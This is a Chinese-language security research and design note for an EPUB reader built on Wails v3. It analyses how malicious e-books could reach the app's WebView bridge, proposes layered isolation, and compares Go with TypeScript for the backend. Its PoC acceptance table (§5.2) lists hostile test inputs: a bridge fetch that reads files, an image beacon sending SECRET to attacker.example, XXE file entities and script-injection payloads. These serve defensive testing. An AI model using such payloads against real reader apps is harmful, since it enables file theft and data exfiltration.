# HPF-Reader:WebView 桥安全隔离 + 后端语言选型(Wails v3 决策后的复核)

> 调研员:backend-research(团队 task-6) · 日期:**2026-11-02** · 交付:docs/research/60-webview-security-backend-lang.md
> 证据规则:关键结论附来源链接与访问日期;源码证据给到 **文件:行号**;查不到的一律标 **未验证**,不编 CVE 编号。
> 本文只做调研与设计,不含业务代码;配置片段与伪代码均为**设计草案**。

---

## 0. 结论速览(先回答 lead 的两个问题)

### A 部分:不可信 EPUB 隔离 —— 结论是"必须自建隔离,不能依赖 Wails 默认行为"

| # | 结论 | 证据强度 |
|---|------|----------|
| A-1 | Wails v3 桌面/移动端(!server 构建)对 `/wails/runtime` **不做任何来源/帧校验** —— `checkRuntimeRequest` 直接 `return true` | 源码级(见 §3) |
| A-2 | 默认 bridge 走 **HTTP fetch**:`window.location.origin + "/wails/runtime"`,并自动带 `x-wails-client-id` 头。**同源子 frame 无需任何额外知识即可调用全部绑定** | 源码级 |
| A-3 | 只有在 **server 构建**下才有 Origin 校验(`transport_http_server.go`);桌面应用默认不是 server 构建 | 源码级 |
| A-4 | Wails 的"子 frame 拒收"保护**只作用于原生 wails: 消息路径**,且 Linux 的 JS 垫片自述"**同源子 frame(about:blank/srcdoc/同源 URL)仍可绕过**" | 源码级(官方注释) |
| A-5 | 参考实现 foliate-js(Readest 的渲染引擎)用的是 **最弱组合** `sandbox="allow-same-origin allow-scripts"` + `srcdoc`,等于**没有隔离** | 源码级 |
| A-6 | 现有真实事故:Calibre(<2.75)EPUB 内 JS 可**任意读文件**;Koodo Reader **EPUB → RCE**(2026-07 修复) | NVD / 厂商公告 |
| A-7 | 因此 HPF 的方案是"**不让书内容进入任何持有 bridge 权限的 frame**"这一架构性约束,而不是依赖 sanitize,也不依赖上游修 bug | 设计结论 |

### B 部分:后端是否也改 Go —— **我的结论是"改,但理由不是 lead 给的那个"**

lead 的假设:外壳是 Go → 后端也用 Go → 与外壳共享 HLC/合并/定位核心。我的诚实评估:

| 判断 | 内容 |
|------|------|
| 假设**部分成立** | 共享同一个 Go module 在工程上完全可行,但可共享的"纯核心"(HLC、locator 序列化、字段级 LWW、墓碑规则)量级只有 **几百行**,不是决定性代码量 |
| 收益**被高估** | 只有当**客户端也做合并(CRDT/离线收敛)**时,"两份合并实现必须同构"才是硬约束。若采用**服务端权威合并**(本文推荐),客户端只维护 **outbox + apply**,不存在第二份合并实现,Readest 的教训就不适用 |
| 我上轮 TS/NestJS 的结论**没有被这个新信息推翻** | 前端依旧是 TS(Vue 3),类型/校验共享的论据不变;换外壳语言 ≠ 换后端语言的充分理由 |
| 但最终**仍推荐 Go** | 理由换成了更硬的几条:**Wails 已强制引入 Go 工具链**、**单静态二进制对自托管极友好**、**sqlc + Postgres 契合数据密集型合并逻辑**、**内存占用更低**。这是**弱推荐**,不是强推荐 |
| 复评条件 | 若团队 TS 熟练度显著更高、或 Web/PWA 成为主战场、或 LLM 功能价值占比 >50% → 回到 TS(+Python LLM sidecar)完全合理 |

详见 §6 与 §10。

---

# A 部分:不可信 EPUB 的隔离方案

## 1. 攻击面:恶意 EPUB 到底能做什么(全部有据)

| 攻击面 | 具体手法 | 真实证据(编号与描述均来自 NVD / 厂商公告,未编造) |
|--------|----------|--------------------------------------------------|
| **书内脚本执行** | EPUB/XHTML 内嵌 `<script>`、事件处理器;阅读器把书内容注入拥有宿主权限的上下文 | `CVE-2016-10187`:Calibre E-book viewer < 2.75,"允许远程攻击者通过**带 JavaScript 的构造 EPUB 读取任意文件**"(NVD,发布 2017-03-16) |
| **书内脚本 → 代码执行** | 子 frame 拿到宿主 API(node integration / 原生桥) | `CVE-2026-55408`:Koodo Reader ≤2.3.0 通过 `nodeIntegrationInSubFrames` + 未净化 `innerHTML` 实现 RCE,CVSS 3.1 = **8.4**,修复于 2.3.1(发布 2026-07-07)。**与 Wails 的威胁模型高度同构** |
| **XXE / 外部实体** | OPF/NCX/XHTML 里声明外部实体,解析器解析 `file://` | `CVE-2016-9487`:EpubCheck 4.0.1 "解析 EPUB 内 XML 时未正确限制外部实体,可读取任意文件",CVSS 3.1 = **7.8**(NVD,发布 2018-07-13) |
| **压缩炸弹 / 解压 DoS** | 嵌套 zip、高压缩比条目,解压耗尽内存/磁盘 | 通用类漏洞有据:`CVE-2019-13232`(Info-ZIP UnZip 6.0 处理重叠条目不当,CVSS 3.3)。**EPUB 专用的 zip 炸弹 CVE 本次未找到**(未验证)——但 EPUB 本质是 zip,风险同构 |
| **字体/图像解析器** | 恶意 TTF/OTF/WOFF 触发解析器内存破坏 | FreeType 类历史漏洞众多:NVD keywordSearch=freetype 返回 **112 条**;本次抽查前 8 条均为早期条目,**未逐条核验**;是否影响各平台 WebView 取决于系统字体栈(未验证) |
| **PDF 引擎** | PDF.js 特权越界 | `CVE-2013-5598`:PDF.js "未正确处理追加 IFRAME 元素",可致特权提升/任意文件读;`CVE-2015-2743`:"内部 Worker 被赋予过高权限"。说明 **PDF 解析同样属于不可信输入面** |
| **外部资源加载(隐私/追踪)** | 远程图片、远程 CSS/@import、远程字体、`<link rel=stylesheet>`;泄漏 IP、阅读时间、书内位置 | 设计层面成立;本次**未取得一手研究链接**,标 **未验证** |
| **CSS 侧信道外泄** | 通过属性选择器 + 背景图请求把 DOM 内容编码进 URL | 设计层面成立;本文不引用具体论文,**未验证** |
| **导航劫持** | `<meta http-equiv="refresh">`、`<a target="_top">`、`window.open` 把宿主窗口导航到远程站点 | 代码层可实现;Readest 的 fragment sanitizer 明确 `FORBID_ATTR: ['srcdoc']` 并禁 `iframe`,说明这类风险被参考实现认可 |
| **EPUB 之外的输入** | 封面图(远端 URL)、OPDS 目录、RSS/网页转书(Readest Send 功能会抓 HTML) | Readest 对 RSS/OPDS/转书路径全部过 DOMPurify(见 §2) |

> 结论:EPUB 是**"脚本 + XML + zip + 字体 + 远程资源"的复合不可信输入**。任何"只是排版不会有风险"的假设(CVE-2016-10187 时代就已被打破)都不能作为设计前提。

## 2. 现有阅读器怎么防(逐条源码核实)

| 产品 | 隔离做法 | 证据(文件:行) | 评价 |
|------|----------|----------------|------|
| **Readest** | ① 书 XHTML 经 DOMPurify `WHOLE_DOCUMENT` 净化,`FORBID_TAGS: ['script','iframe','object','embed']` + `FORBID_ATTR: ['srcdoc']`;② 有 `viewSettings.allowScript` 开关(默认关);③ **从书里复制到宿主窗口的片段二次净化**(`FORBID_TAGS` 含 `style/iframe/form/input`);④ OPDS 代理响应加 `Content-Security-Policy: sandbox; default-src 'none'; frame-ancestors 'none'` + `X-Content-Type-Options: nosniff` | `src/services/transformers/sanitizer.ts:37-62`、`src/app/api/opds/proxy/route.ts:394-398`(访问 2026-11-02) | 内容层做得扎实;但**渲染层 iframe 仍是同源 + 允许脚本**(见下行),依靠的是"净化"这一道单层防线 |
| **foliate-js**(Readest fork;上游 johnfactotum/foliate-js 同源) | 每个 spine 文档一个 iframe,`setAttribute('sandbox','allow-same-origin allow-scripts')`,内容经 `iframe.srcdoc = data` 注入 | `paginator.js:783` 与 `:885`;`fixed-layout.js:674`、`:704`、`:1226`、`:1248`(访问 2026-11-02) | **最弱沙箱组合**:`allow-same-origin + allow-scripts` 等于没有隔离(可访问 `window.top`);`srcdoc` 继承宿主 origin |
| **foliate-js 为何这样选** | README 自述:受 WebKit Bug 218086 影响必须给 `allow-scripts`;父窗口需要 `iframe.contentDocument` 做分页/选区/高亮 | `README.md:79`(访问 2026-11-02) | 解释了历史原因,但也说明**要拿到强隔离必须重构引擎与宿主的边界** |
| **KOReader** | 使用自研 crengine 渲染,不跑 JS 引擎 | 本次**未核验源码**,标 **未验证**(推测其脚本攻击面显著更小) | 若成立,是"不支持脚本"换安全的典型 |
| **Calibre / calibre-web** | 历史上 viewer 允许 JS → CVE-2016-10187;calibre-web 另有认证绕过 `CVE-2020-12627`(硬编码密钥) | NVD(访问 2026-11-02) | 说明"服务端/阅读器都要独立加固" |
| **Apple Books** | 闭源,无公开技术说明 | **未验证** | 不引用其做法 |

> 关键洞察:**所有参考实现的安全都建立在"净化"这一层**。一旦净化被绕过(新标签、新属性、解析器差异、DOMPurify 版本 CVE),剩余防线就是那个"弱沙箱"。HPF 不能重复这个单点。

## 3. Wails v3 桥的威胁模型(源码级证据)

### 3.1 桥是怎么工作的(与我们原来的想象不同)

| 事实 | 证据 |
|------|------|
| 默认 IPC 传输是 **HTTP fetch POST 到 `/wails/runtime`** | `v3/pkg/application/application_options.go:119`:"The default transport uses HTTP fetch requests to /wails/runtime" |
| URL 由**当前文档的 origin** 拼出 | `v3/internal/assetserver/bundledassets/runtime.debug.js:142`:`return window.location.origin + "/wails/runtime"` |
| 请求自动携带窗口身份头 | 同文件 `:165-168`:`["x-wails-client-id"]: clientId`、`headers["x-wails-window-name"] = windowName` |
| 服务端把这些头当作**权威身份** | `v3/pkg/application/messageprocessor.go:85-160`(`getTargetWindow` 只看 ClientID/WebviewWindowName/WebviewWindowID) |
| 帧来源**完全不被记录** | 框架只在每个 webview 请求上注入 window 级头:`v3/pkg/application/application.go:390-402`(`x-wails-window-id/name`),子 frame 与主 frame 的请求**带同一个 window id** |
| 桌面/移动构建**不做任何校验** | `v3/pkg/application/transport_http_notserver.go:1-13`:`//go:build !server ... checkRuntimeRequest(...) bool { return true }`,注释:"desktop and mobile webviews deliver runtime calls through the app's own asset handler rather than a network listener" |
| 只有 server 构建校验 Origin | `v3/pkg/application/transport_http_server.go:13-74`(同源或 WebSocketOriginPatterns 白名单,WebSocketAllowAllOrigins 可关闭) |
| 请求体解析**不看 Content-Type** | `v3/pkg/application/transport_http.go:283-291`(`json.Unmarshal(bodyBytes, &body)`);全文没有任何入站 Content-Type 校验 |
| 官方安全文档**没有提到 iframe/CSP/桥** | `https://wails.io/guides/security/`(页面标注 Last updated: Nov 2, 2026)只讲输入校验、bcrypt、HTTPS、`os.OpenRoot` 文件约束 |

### 3.2 那"子 frame 拒收"保护到底保护了什么?

| 机制 | 覆盖范围 | 证据 |
|------|----------|------|
| `handleWindowMessage` 中 `if event.childFrame { return }`(丢弃子 frame 的 wails: 消息) | **仅原生脚本消息路径**,且仅当平台能报告 `childFrame` | `application.go:889-895` |
| macOS / iOS 原生上报 `isMainFrame` | 真机上有归因能力 | `application_darwin.go:409-411`、`application_ios.go:393` |
| Linux(WebKitGTK)无法归因 → 注入 JS 垫片包装 `window.webkit.messageHandlers.external` | **官方自述有绕过**:"a same-origin child frame (about:blank, srcdoc, same-origin URL) can still reach window.top.webkit directly. Cross-origin and sandboxed frames cannot." | `v3/pkg/application/linux_child_frame_guard.go:6-15` |
| HTTP 传输路径(`/wails/runtime`) | **完全不在上述保护范围内**(它是 fetch,不是脚本消息) | §3.1 的 !server 校验直通 |

### 3.3 回答任务里的具体问题:「iframe 为 opaque origin 时,子 frame 还能否成功调用?」

| 调用方式 | 结论 | 依据 |
|----------|------|------|
| 使用 wails runtime helper(`Call.ByName` 等) | **不能** | helper 用 `window.location.origin` 拼 URL;opaque origin 下该值为 null → 请求地址无效(runtime.debug.js:142)。**此项为代码推断,建议在 PoC P-02 中实测确认** |
| 手写**绝对 URL** + `Content-Type: application/json` | **基本不能** | 跨源 + 非简单请求 → 触发 CORS 预检 `OPTIONS /wails/runtime`;asset server 不返回 ACAO/预检响应 → 预检失败 → 实际 POST 不发送 |
| 手写**绝对 URL** + **简单请求**(如 `Content-Type: text/plain`,或 form 提交) | **请求会到达处理器并可能被执行为一次桥调用** | `/wails/runtime` 路由不校验 Content-Type(transport_http.go:283-291),`checkRuntimeRequest` 在非 server 构建恒真;OPTIONS 之外没有别的门。响应会被 CORS 挡住(攻击者读不到返回值),但**副作用已经发生**。**此项为源码推断,列为 PoC P-03 必测项** |
| **无 sandbox 的同源 iframe / srcdoc / about:blank 子 frame** | **完全可控**:读得到响应,可调用所有绑定 | 同源 fetch + 恒真校验 + 无帧归因 → 这是 §3.1 的直接推论,也是 `CVE-2026-55408` 的同构场景 |
| 在 Android 上 | `addJavascriptInterface` 注入的原生桥(`nativeHandleRuntimeCall`)是否对子 frame 可见**需要实测** | `v3/pkg/application/application_android.go:874-875`;**未验证**子 frame 可见性 |

> **一句话威胁模型**:在桌面/移动端,**"渲染了书内容"等价于"书内容与宿主处于同一信任域"** —— 只要书内容能执行脚本且与宿主同源,它就能调用全部 Go 服务(读文件、写文件、访问本地库),这与 Koodo Reader 的 RCE 属于同一类。

### 3.4 我们**不能**依赖的三件事

1. 不能依赖 "Wails 会拒绝子 frame 调用" —— 该保护不在 HTTP 路径上,且 Linux 垫片自述同源可绕过。
2. 不能依赖 `sandbox="allow-same-origin allow-scripts"` —— 它不提供隔离(foliate-js 现状)。
3. 不能依赖 "官方安全文档" —— 它没有覆盖这个威胁(见 §3.1 最后一行)。

## 4. 纵深防御方案(可实施、可验收)

### 4.1 架构决策:书内容**永不**进入有桥权限的 frame

| 方案 | 结构 | 隔离强度 | 对 foliate-js 的改动 | 采纳 |
|------|------|----------|----------------------|------|
| **Arch-A(推荐)** | **引擎 frame**(可信,同源,运行我们的代码)+ **内容 frame**(opaque origin,只放净化后的 HTML/CSS) | 强:书内容无法执行脚本、无法读宿主 DOM | 需要把"分页/选区"改为 postMessage 协议;引擎 frame 持有 `contentDocument` 的假设要重构 | ✅ M1 |
| **Arch-B(退路)** | 整个阅读器(引擎+内容)放进**独立 WebViewWindow**,主窗口不渲染书;中间件按 `x-wails-window-id` 拒绝该窗口对 `/wails/runtime` 的调用,只放行一个窄接口(bookBytes/saveProgress) | 中强:即使内容 frame 同源,它能触达的桥面被砍到最小 | 改动小,兼容 foliate-js 现状 | ✅ M1 备选 |
| **Arch-C(否决)** | 书内容与宿主同源 iframe + 仅靠 DOMPurify | 弱(单点) | 无 | ❌ |
| **Arch-D(否决)** | 每本书一个独立 WebView 进程/窗口,无任何 bridge | 最强 | 需要自定义窗口间 IPC,复杂度高 | 延后评估 |

**Arch-A 关键约束**:引擎 frame 里**绝不能**把书内容写成 HTML(除非写进 opaque 内容 frame);书内容只能以"净化后的字符串 → `postMessage` → 内容 frame 的 document.write/srcdoc"路径进入。这条约束是"即使 sanitizer 被绕过也打不穿"的根基:**内容 frame 无论注入什么都不持有桥权限**。

### 4.2 分层措施清单

| 层 | 措施 | 具体配置草案 |
|----|------|--------------|
| L1 内容净化 | DOMPurify(固定版本、随依赖升级做安全评审) | `WHOLE_DOCUMENT: true`;`FORBID_TAGS: ['script','iframe','object','embed','form','input','base','meta','link']`(允许 link 时只允许内联 data:);`FORBID_ATTR: ['srcdoc','http-equiv','formaction','ping']`;`ALLOWED_URI_REGEXP` 仅允许 data:/blob:(默认**不允许 http(s):**) |
| L1' CSS 净化 | 剥离 @import、url(http…)、行为属性;仅允许 data:/blob: 图片与字体 | 自研 CSS 解析过滤(不要只做字符串替换) |
| L2 帧隔离 | 内容 frame 属性 | `sandbox="allow-scripts"`(→ opaque origin,**不给** allow-same-origin / allow-top-navigation / allow-popups / allow-forms / allow-modals / allow-downloads);`referrerpolicy="no-referrer"`;`allow=""`;`loading="lazy"`;若 WebView 支持,额外用 `csp` 属性 |
| L3 内容 CSP | 内容 frame 文档内 CSP | `default-src 'none'; img-src data: blob:; style-src 'unsafe-inline'; font-src data:; media-src data: blob:; script-src 'none'; connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'` |
| L4 引擎 CSP | 引擎 frame 文档 CSP | `default-src 'self'; script-src 'self' 'nonce-<per-launch>'; style-src 'self' 'unsafe-inline'; img-src data: blob: 'self'; connect-src 'self'; object-src 'none'; frame-src 'self'`(只允许加载我们自己的内容 frame) |
| L5 桥硬化(**Wails 侧,必须做**) | 在 `AssetServerOptions.Middleware` 中对 `/wails/runtime` 加门 | ① 要求一次性会话头 `X-HPF-IPC: <per-launch nonce>`,仅由主 frame 的启动脚本设置(覆盖 `window.fetch` 注入);② 拒绝 `Origin: null` 与 `Sec-Fetch-Site: cross-site`;③ 按 `x-wails-window-id` 拒绝阅读器窗口(Arch-B);④ 其余一律 403。**注意:中间件与 HTTPTransport 的执行顺序需在 PoC 中确认**(transport.go:58-67 说明 Handler() 被挂进 asset server 中间件链) |
| L6 能力最小化 | 绑定服务面 | 不暴露通用 fs/shell/exec;所有路径来自 Go 侧白名单 + `os.OpenRoot`(Wails 官方推荐);每个方法都校验 window + 用户;绑定方法视为"公网 API"对待 |
| L7 输入限制 | EPUB 解压与解析预算 | 条目数 ≤ 10k;单条目解压后 ≤ 100 MB;总解压 ≤ 2 GB;压缩比 > 100:1 拒绝;XML 解析禁用 DTD/外部实体;超时 30s |
| L8 网络出口 | 出站白名单 | 只有"封面/元数据抓取"等明确功能允许出站,且走 Go 侧代理(不在渲染进程发请求);书内容一律 `connect-src 'none'` |
| L9 导航 | 外链处理 | 书内链接**不允许**导航宿主;`<a href>` 点击 → postMessage 给宿主 → 宿主用系统浏览器打开(用户手势 + http/https 白名单) |
| L10 发布工程 | 依赖与回归 | DOMPurify/WebView 版本纳入 SBOM;每次依赖升级跑 PoC 清单;打包时确保 allowScript 类开关默认关 |

### 4.3 「即使上游不修也不能被打穿」的论证

1. **不变量**:任何携带 bridge 权限的 frame 内,**不存在书控制的内容**(Arch-A 的内容 frame 是 opaque origin 且被 CSP 锁死;引擎 frame 只接收 `postMessage` 传来的**纯数据 + 已净化字符串**)。
2. 该不变量不依赖 Wails 的帧归因、不依赖 CORS 行为、不依赖 Content-Type 校验 —— 它依赖的是**我们自己的窗口/帧划分**,属于可控项。
3. 即使 L1 净化被 0day 绕过:内容 frame 是 opaque origin,helper 拼出的 `null/wails/runtime` 无法调用;手写绝对 URL 走跨源路径(简单请求最多造成"无返回值的一次调用"),而 L5 的 nonce 门会直接 403 —— **仍打不穿**。
4. 即使 L2 sandbox 因某平台实现缺陷失效(WebView bug):帧仍无桥 nonce,且 L5 按 window id 限权(Arch-B)/按 nonce 限权(Arch-A)。
5. 唯一剩下的风险面是**能力自身的设计**:如果某个绑定方法本身就能读任意文件,那么任何一次成功调用都是致命的 → 因此 L6 是最后一道、也是最重要的一道(与"桥是否被绕过"无关)。

---

# A 部分(M1 验收):安全 PoC 清单

## 5. M1 安全 PoC 验收清单(可执行)

### 5.1 测试矩阵

| 环境 | WebView | 必须测 |
|------|---------|--------|
| Windows 11 | WebView2(Chromium) | ✅(主目标) |
| macOS 14+ | WKWebView | ✅ |
| Linux(Ubuntu 24.04) | WebKitGTK 2.4x | ✅(垫片行为特殊) |
| Android | 系统 WebView | ✅(若移动端进 M1) |
| iOS | WKWebView | 可选 |

### 5.2 用例表(每条都要"修复前失败 / 修复后通过"的对照记录)

| ID | 攻击用例 | 做法 | 期望结果 |
|----|----------|------|----------|
| P-01 | **基线复现:同源无沙箱 iframe 调桥** | 在 srcdoc/同源 iframe 内 `fetch(window.location.origin + "/wails/runtime", {method:'POST', body: JSON.stringify({object:0,method:0,args:{...}})})` 调用一个读文件绑定 | **加固前:成功返回文件内容(证明漏洞真实存在)**;加固后:403 + 无副作用。此条是"PoC 真的有效"的证据 |
| P-02 | opaque origin + 官方 helper | `sandbox="allow-scripts"` 帧内 import 官方 runtime 后调用绑定 | 失败:URL 为 null/wails/runtime 或网络错误;服务端日志**无**该调用 |
| P-03 | opaque origin + 绝对 URL 简单请求 | `fetch("http://wails.localhost/wails/runtime", {method:'POST', headers:{'Content-Type':'text/plain'}, body:'{"object":0,...}'})` | 加固后:服务端 403(L5 门);**若观察到 200/副作用 → L5 未生效,判定失败** |
| P-04 | opaque origin + 绝对 URL JSON | 同上但 `Content-Type: application/json` | 预检失败/请求被 CORS 阻断;服务端无该 POST |
| P-05 | 书内 script 执行 | 构造含 `<script>window.__pwned=1</script>` 的章节 | 净化后 `__pwned` 未定义;内容 frame 内 eval 抛 CSP 错误 |
| P-06 | 事件处理器注入 | `<img src=x onerror="...">`、`<svg onload=...>`、`<body onload=...>` | 属性被剥离;无执行 |
| P-07 | 本地文件读取 | `<img src="file:///C:/Windows/win.ini">`、`<a href="file:///...">` | 无请求、无内容回显 |
| P-08 | 远程资源外泄 | `<img src="https://attacker.example/t.png?d=SECRET">`、远程 CSS/@import/远程字体 | 抓包(mitmproxy/Wireshark)**零出站**;CSP 违规事件被记录 |
| P-09 | 导航劫持 | `<meta http-equiv="refresh" content="0;url=https://evil">`、`<a target="_top">`、window.open | 宿主窗口 URL 不变;无新窗口 |
| P-10 | zip 炸弹 | 嵌套 zip / 高压缩比 EPUB(如 10 MB → 10 GB) | 导入在预算内失败并给出明确错误;进程内存不超阈值 |
| P-11 | XXE | OPF/NCX 内 `<!ENTITY xxe SYSTEM "file:///...">` | 解析器不解析外部实体;元数据里无文件内容 |
| P-12 | 跨帧越权 | 内容 frame 内尝试 `window.top.document` / `window.parent.wails` | 抛跨源异常;取不到任何对象 |
| P-13 | 直接 import 生成的绑定 | 内容 frame 内 import 生成的 bindings 并调用特权方法 | 403/桥 nonce 缺失被拒 |
| P-14 | 外链正常路径 | 点击书内 http 链接 | 走宿主确认 → 系统浏览器打开(功能不退化) |
| P-15 | 主流程回归 | 打开 EPUB/TXT/PDF、翻页、目录、搜索、批注、进度同步 | 全部正常(加固不得破坏功能) |
| P-16 | CSP 生效验证 | 帧内尝试 new Function / 内联脚本 | 被 CSP 拒绝;DevTools 有违规日志 |
| P-17 | 窗口级限权(Arch-B) | 阅读器窗口内调用任一绑定 | 403(该 window id 被拒);主窗口调用正常 |
| P-18 | 恶意语料扫描 | 一批公开恶意/畸形 EPUB + epubcheck + 模糊测试样本 | 无崩溃、无出站、无越权;记录崩溃样本 |
| P-19 | 字体/图片畸形 | 畸形 TTF/PNG/JPEG 样本 | 解析失败被捕获,不崩溃(依赖系统解析器的部分标注残余风险) |
| P-20 | 远程封面抓取隔离 | 抓取远程封面 | 由 **Go 侧**发起(不在渲染进程),渲染进程仍零出站 |

### 5.3 通过标准

| 项 | 标准 |
|----|------|
| 阻断类 | P-02~P-04、P-07、P-08、P-09、P-12、P-13、P-17 全部"无请求/无副作用 + 服务端 403 记录" |
| 净化类 | P-05、P-06、P-11、P-18 的恶意语料全部被剥离/拒绝,且有单元测试固化 |
| 资源类 | P-10、P-19 不导致崩溃/内存耗尽 |
| 功能类 | P-14、P-15 全通过(隔离不得以牺牲功能为代价) |
| 证据 | 每案例留:网络抓包、服务端日志(含 403 记录)、截图、加固前后对照 |
| 门禁 | P-01 的"加固前成功"必须留证;**P-03 若出现副作用即视为 M1 不通过** |

---

# B 部分:后端语言选型(Go vs TypeScript)

## 6. 评估 lead 的关键洞察:能否与外壳共享 HLC/合并核心?

### 6.1 先把"可共享的东西"拆开

| 组件 | 行数量级(估) | 是否适合共享 | 说明 |
|------|---------------|--------------|------|
| HLC 生成/比较 | 80-150 行 | ✅ 非常适合 | 纯函数,无依赖 |
| 字段级 LWW 合并 + 墓碑规则 | 150-300 行 | ✅ 适合 | 纯函数 + JSON 结构 |
| locator 序列化/规整(Readium Locator ↔ 内部结构) | 150-300 行 | ✅ 适合 | 纯函数 |
| 变更日志/增量游标协议对象 | 100-200 行 | ✅ 适合 | 结构体/DTO |
| **数据库访问与事务** | 大 | ❌ | 客户端是 SQLite、服务端是 Postgres,SQL 方言与 schema 不同 |
| **冲突的"裁决时机"** | — | ⚠️ 取决于架构 | 见 6.2 |
| 解析(EPUB/PDF/TXT) | 很大 | ❌(Wails 侧可用 Go 库,服务端另说) | 解析结果可落库复用 |

> 合计可共享的**纯核心约 500-1000 行**。这确实有价值(能消除"两份实现漂移"),但它不是"后端必须换语言"的决定性代码量。

### 6.2 决定性问题:合并发生在哪里?

| 架构 | 客户端职责 | 是否需要"两份合并实现" | 共享核心的收益 |
|------|------------|------------------------|----------------|
| **S1 服务端权威合并(推荐 M1)** | 只维护 **outbox(本地待发操作)+ apply(应用服务端结果)**;不做 LWW 裁决 | ❌ 不需要 —— 只有一份合并实现(服务端) | 收益降为"共享 HLC 生成 + locator 规整 + 协议 DTO",约 300-600 行 |
| S2 客户端也合并(离线多设备收敛/CRDT) | 客户端独立做 LWW/HLC 合并,服务端再做一次 | ✅ 需要,**且必须同构** | 收益巨大 —— 这正是 Readest 的教训 |
| S3 客户端纯本地、服务端只存快照 | 客户端全权 | ❌ 但多设备会互相覆盖 | 无 |

**Readest 的教训**(本团队已核实):Readest 同时维护客户端 TS 与 服务端 PL/pgSQL 的合并逻辑(`docker/volumes/db/migrations/004_crdt_merge_replica_fn.sql`),并以共享测试向量 + 两端同构来维持一致。如果我们走 S1,这个教训**不适用**。

**据此对 lead 的假设给出诚实结论**:

- 若走 **S1**(推荐):"后端用 Go 以便与外壳共享合并核心"的**技术必要性大幅下降** —— 共享的只是几百行纯函数,写成两种语言并用**共享 JSON 测试向量**做一致性验证,成本可能低于换栈成本。
- 若走 **S2**(例如要支持"两个设备都离线、回来后都要收敛"的强离线语义):共享核心的收益**立刻变真实**,此时"外壳 Go + 后端 Go"是本方案里最省事的组合。
- 因此:**"外壳是 Go"本身不构成后端换 Go 的充分理由**;它只是让 Go 成为一个**更便宜**的选项(工具链已在、DSL 已在、CI 已在)。

### 6.3 收益/代价对照

| 维度 | Go 后端 | TS/NestJS 后端(上轮推荐) |
|------|---------|---------------------------|
| 与外壳共享纯核心 | ✅ 同一 module,零重复 | ❌ 需 TS 重实现或 WASM 化 |
| 与前端(Vue)共享类型/校验 | ⚠️ 需 OpenAPI → TS 生成 | ✅ 天然(zod/schema 直接复用) |
| 工具链数量 | ✅ 1 套(Go + Node 仅构建前端) | ⚠️ 2 套(Node 服务端 + Go 外壳),仍需 Go 工具链 |
| 部署(自托管) | ✅ 单静态二进制 + 可选 PgBouncer | ⚠️ Node 运行时 + 依赖树 |
| 数据密集/合并逻辑 | ✅ sqlc + Postgres 契合 | ✅ 也完全可以(Drizzle) |
| LLM/RAG 生态 | ⚠️ 较弱(官方 SDK 有,但生态薄) | ✅ Vercel AI SDK 等成熟 → 用 Python sidecar 也可 |
| 内存/冷启动 | ✅ 更低 | ⚠️ 更高 |
| 招人/招聘池 | ⚠️ 后端 Go 池小一些 | ✅ Web 全栈池最大 |
| 迁移成本(相对上轮方案) | 中(需把已设计的 DDL/API 落到 sqlc 风格,数据模型不变) | 0 |

## 7. Go 后端生态横评(所有仓库均于 2026-11-02 通过 GitHub API 核验存在、未归档)

| 层 | 推荐 | 备选 | 核验数据(stars / 最近 push) | 说明 |
|----|------|------|------------------------------|------|
| Web 框架 | **chi** | echo、gin、Fiber | chi 23,041 / 2026-10-18;echo 32,786 / 2026-10-30;gin 89,474 / 2026-10-10;Fiber 40,241 / 2026-11-02 | chi 基于 net/http,中间件生态直接可用,契合"少量路由 + 大量中间件"的自托管服务。gin/echo 亦可;Fiber 基于 fasthttp,与 net/http 中间件不通用(**据其官方文档,本次未逐行核验**) |
| SQL 与代码生成 | **sqlc** | ent、GORM | sqlc 18,432 / 2026-11-02;ent 17,221 / 2026-10-14;GORM 39,986 / 2026-10-24 | 合并逻辑是"SQL 密集 + jsonb + ON CONFLICT",sqlc 生成类型安全代码、SQL 自己掌控;ORM 会挡住 Postgres 特性 |
| 驱动 | **pgx** | database/sql | pgx 14,374 / 2026-10-31 | 原生 Postgres 协议,支持 COPY/batch/jsonb |
| 迁移 | **goose** | atlas | goose 11,651 / 2026-10-31;atlas 8,806 / 2026-10-28 | 与 sqlc 组合常见;Atlas 更适合"声明式 schema 管理"。**无论选哪个,迁移必须独立于进程启动**(上轮已论证) |
| OpenAPI → TS 客户端(给 Vue) | **oapi-codegen** + openapi-typescript | — | oapi-codegen 8,639 / 2026-11-01 | Go 侧生成 server stub/类型;前端用 TS 生成器消费同一 spec |
| 后台任务 | **river** | asynq | river 5,848 / 2026-11-02;asynq 13,806 / 2026-10-19 | river 基于 Postgres(少一个组件、事务内入队);asynq 基于 Redis(吞吐更高)。若已用 Redis 做缓存/限流,asynq 是自然选择 |
| 认证/JWT | **golang-jwt/jwt** | coreos/go-oidc、markbates/goth(**未验证**) | golang-jwt 9,260 / 2026-11-01 | 自研 access token 验签;OIDC/OAuth 的库本次未核验,列出但标 **未验证** |
| 向量检索(LLM/RAG) | **pgvector**(+pgx) | — | pgvector 23,567 / 2026-10-31 | 用 Postgres 一套搞定,避免 M1 引入独立向量库 |
| SSE 流式(LLM) | 标准库 `http.Flusher` | — | — | 无需框架;注意反向代理缓冲与超时配置 |
| 观测 | OpenTelemetry Go + Prometheus | — | 未核验 | 沿用上轮结论 |

**推荐组合(M1)**:chi + sqlc + pgx + goose + oapi-codegen + river(或 asynq)+ golang-jwt + pgvector + OpenTelemetry。

## 8. Web 目标端的矛盾(浏览器跑不了 Go)

| 方案 | 做法 | 代价 | 建议 |
|------|------|------|------|
| **W1 在线优先 + 服务端权威合并** | 浏览器只做:IndexedDB 缓存 + outbox + apply;不做 LWW/CRDT 裁决 | Web 端离线不能"多设备收敛"(但阅读器 Web 版离线本来就是次要场景);需要网络 | ✅ **M1 采用** |
| W2 TS 再实现一遍合并 | 与 Go 服务端并行维护第二份合并实现 | **必须同构**(Readest 教训);需要共享 JSON golden vectors + 双端 CI;长期维护负担 | ⚠️ 仅当 Web 端强离线成为刚需 |
| W3 Go → WASM(GOOS=js GOARCH=wasm / TinyGo) | 把纯核心编成 wasm 给浏览器 | 体积与 GC 开销(数百 KB~MB 级,依裁剪);与 WebView 的 JS 互操作成本;**本次未实测体积**,标 **未验证** | ⚠️ 备选,先做体积/性能实测 |
| W4 服务端渲染一切 | 浏览器只是瘦客户端 | 弱网体验差 | 作为 W1 的补充 |

**强制一致性手段(无论 W1/W2)**:把 HLC 比较、LWW 裁决、墓碑规则、locator 规整写成**语言无关的 golden vector 文件**(JSON:输入/期望输出),Go 与 TS(若存在)各自跑同一份向量。这样"同构"从"靠人盯"变成"靠 CI 卡"。

